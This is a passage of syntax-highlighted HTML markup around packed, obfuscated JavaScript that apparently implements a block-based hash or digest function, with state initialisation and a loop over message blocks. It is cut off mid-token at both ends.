class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20s&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x272p&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201S&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">S&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x274S&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x271e&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">T&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20O&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201t&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="nx">Z&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">O&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202r&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">)}}&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">K&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="nx">Z&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">N&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">||&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">Y&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201S&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">n&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">S&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">O&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201Y&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">)).&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x271e&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20P&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">)}};&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202z&lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202k&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">X&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20w&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20O&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201P&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">S&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">)[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">X&lt;/span>&lt;span class="p">]()}};&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202f&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20P&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x271e&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">);&lt;/span>&lt;span class="nx">P&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">T&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20O&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201P&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">)};&lt;/span>&lt;span class="nx">P&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">S&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20P&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">T&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">G&lt;/span>&lt;span class="p">).&lt;/span>&lt;span class="nx">S&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">)};&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">g&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">W&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="o">++&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20T&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">];&lt;/span>&lt;span class="nx">P&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">T&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">T&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20P&lt;/span>&lt;span class="p">};&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20N&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">v&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">9&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">10&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">11&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">12&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">13&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">14&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">15&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]}&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">U&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">K&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">T&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">X&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">B&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">W&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">E&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">Y&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">Z&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">V&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">I&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">O&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">H&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">F&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">D&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">U&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">O&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">j&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">x&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">N&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">Q&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">S&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">w&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">U&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">A&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202h&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">T&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">c&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20s&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">T&lt;/span>&lt;span class="o">!==&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x272p&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">T&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x271n&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x27&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20O&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201t&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">y&lt;/span>&lt;span class="o">&amp;amp;&amp;amp;&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">J&lt;/span>&lt;span class="o">===&lt;/span>&lt;span class="nx">Z&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">O&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x202r&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">K&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">)){&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">!&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">y&lt;/span>&lt;span class="o">||!&lt;/span>&lt;span class="nx">Z&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">N&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">)){&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20O&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201t&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">)}}}&lt;/span>&lt;span class="nx">z&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">u&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20O&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x201t&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">)}&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">d&lt;/span>&lt;span class="p">}&lt;/span>&lt;span class="nx">q&lt;/span>&lt;span class="err">\&lt;/span>&lt;span class="nx">x20r&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">M&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">W&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">s&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">W&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="nx">t&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">M&lt;/span>&lt;span class="o">&amp;lt;&lt;/span>&lt;span class="nx">W&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">p&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="p">){&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">L&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">O&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">k&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="nx">C&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">16&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">4&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">5&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">6&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">7&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nx">l&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="mi">8&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="o">=&lt;/span>&lt;span 